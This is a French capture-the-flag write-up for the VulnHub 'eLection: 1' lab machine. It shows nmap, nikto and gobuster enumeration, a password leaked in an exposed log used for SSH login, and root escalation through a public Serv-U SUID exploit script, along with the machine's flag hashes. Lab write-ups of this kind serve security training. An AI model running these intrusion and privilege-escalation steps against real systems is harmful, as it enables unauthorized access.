---
title: "CTF eLection: 1"
date: 2021-05-04
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/election-1,503/
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.20`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir Election1 && cd Election1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
Nmap scan report for election.home (192.168.1.20)
Host is up (0.0036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

On a un un serveur **SSH** sur le port **22** et un serveur **Apache** 2.4.29 sur le port **80**.

Astuce vous pouvez ajouter le domaine _election1.home_ dans le fichier `/etc/hosts` avec **Vim** (ou un autre éditeur de texte).

```bash
$ sudo vim /etc/hosts
192.168.1.20    election1.home
```

Testons la sécurité du serveur **Apache** avec **Nikto**.

```bash
$ nikto -h http://$IP -o nikto.txt
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 59558e1434548, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ /phpinfo.php: Output from the phpinfo() function was found.
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
```

Dans le fichier [/robots.txt](http://election1.home/robots.txt), on a une liste de 4 répertoires potentiels.

```txt
admin
wordpress
user
election
```

Seul le dernier lien "election" fonctionne. On scanne le contenu du site avec **Gobuster**

```bash
$ gobuster dir -u http://$IP/election -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
/index.php            (Status: 200) [Size: 7003]
/media                (Status: 301) [Size: 321] [--> http://192.168.1.20/election/media/]
/themes               (Status: 301) [Size: 322] [--> http://192.168.1.20/election/themes/]
/data                 (Status: 301) [Size: 320] [--> http://192.168.1.20/election/data/]
/admin                (Status: 301) [Size: 321] [--> http://192.168.1.20/election/admin/]
/lib                  (Status: 301) [Size: 319] [--> http://192.168.1.20/election/lib/]
/languages            (Status: 301) [Size: 325] [--> http://192.168.1.20/election/languages/]
/js                   (Status: 301) [Size: 318] [--> http://192.168.1.20/election/js/]
/card.php             (Status: 200) [Size: 1935]
```

Scannons le dossier "election/admin" avec **Gobuster**.

```bash
$ gobuster dir -u http://$IP/election/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip
/index.php            (Status: 200) [Size: 8964]
/img                  (Status: 301) [Size: 325] [--> http://192.168.1.20/election/admin/img/]
/plugins              (Status: 301) [Size: 329] [--> http://192.168.1.20/election/admin/plugins/]
/css                  (Status: 301) [Size: 325] [--> http://192.168.1.20/election/admin/css/]
/ajax                 (Status: 301) [Size: 326] [--> http://192.168.1.20/election/admin/ajax/]
/live.php             (Status: 200) [Size: 22]
/js                   (Status: 301) [Size: 324] [--> http://192.168.1.20/election/admin/js/]
/components           (Status: 301) [Size: 332] [--> http://192.168.1.20/election/admin/components/]
/logout.php           (Status: 200) [Size: 83]
/inc                  (Status: 301) [Size: 325] [--> http://192.168.1.20/election/admin/inc/]
/logs                 (Status: 301) [Size: 326] [--> http://192.168.1.20/election/admin/logs/]
/logs.php             (Status: 200) [Size: 22]
/dashboard.php        (Status: 200) [Size: 22]
/guru.php             (Status: 200) [Size: 22]
```

Le répertoire [/election/admin/logs](http://election1.home/election/admin/logs) est intéressant car il contient un fichier "system.log".

```bash
$ cat system.log
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
[2021-04-30 01:19:09]  has been logged out from Unknown IP.
```

On un candidat potentiel "love:P@$$w0rd@123" pour la connexion **SSH**.

### Pénétration

On se connecte en **SSH** au serveur avec l'utilisateur "love".

```bash
$ ssh love@$IP
password: P@$$w0rd@123
```

On trouve facilement le flag user dans le dossier "Desktop" de l'utilisateur.

```bash
$ cat Desktop/user.txt
cd38ac698c0d793a5236d01003f692b0
```

### Escalation

En cherchant les exécutables avec des permisions spéciales pour l'utilisateur courant (**SUID**), on trouve un répertoire qui sort du lot.

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/local/Serv-U/Serv-U
```

En effet, après une brève recherche sur Internet, **Serv-U** est un serveur **FTP** sécurisé. Dans les fichiers présents, on peut retrouver la version utilisée.

```bash
$ cat /usr/local/Serv-U/Serv-U-StartupLog.txt
[01] Fri 30Apr21 01:02:02 - Serv-U File Server (64-bit) - Version 15.1 (15.1.6.25) - (C) 2017 SolarWinds Worldwide, LLC.  All rights reserved.
```

On effectue une recherche d'exploit sur **Searchsploit**.

```bash
$ searchsploit Serv-U 15.1
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1) | linux/local/47009.c
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2) | multiple/local/47173.sh
```

On trouve 2 exploits semblables, le premier est écrit en langage C et le second en Shell.

```bash
$ searchsploit -p 47173
  Exploit: Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)
      URL: https://www.exploit-db.com/exploits/47173
     Path: /usr/share/exploitdb/exploits/multiple/local/47173.sh
File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
```

On copie le fichier `cp /usr/share/exploitdb/exploits/multiple/local/47173.sh .` que l'on converti au format unix pour pouvoir l'exécuter correctement par la suite `dos2unix 47173.sh`. Puis on transfère ce dernier sur le serveur via **SCP** dans le dossier "/tmp".

```bash
$ scp 47173.sh love@$IP:/tmp
password: P@$$w0rd@123
```

Sur le serveur, on se place dans le répertoire "/tmp" pour exécuter le script.

```bash
$ cd /tmp
$ ./47173.sh
[*] Launching Serv-U ...
sh: 1: : Permission denied
[+] Success:
-rwsr-xr-x 1 root root 1113504 Apr 30 01:44 /tmp/sh
[*] Launching root shell: /tmp/sh
sh-4.4# id
uid=1000(love) gid=1000(love) euid=0(root) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
```

L'exploit a fonctionné, on a les droits de l'utilisateur root.

```bash
$ whoami
root
```

On peut donc accéder au flag root.

```bash
$ cat /root/root.txt
5238feefc4ffe09645d97e9ee49bc3a6
```
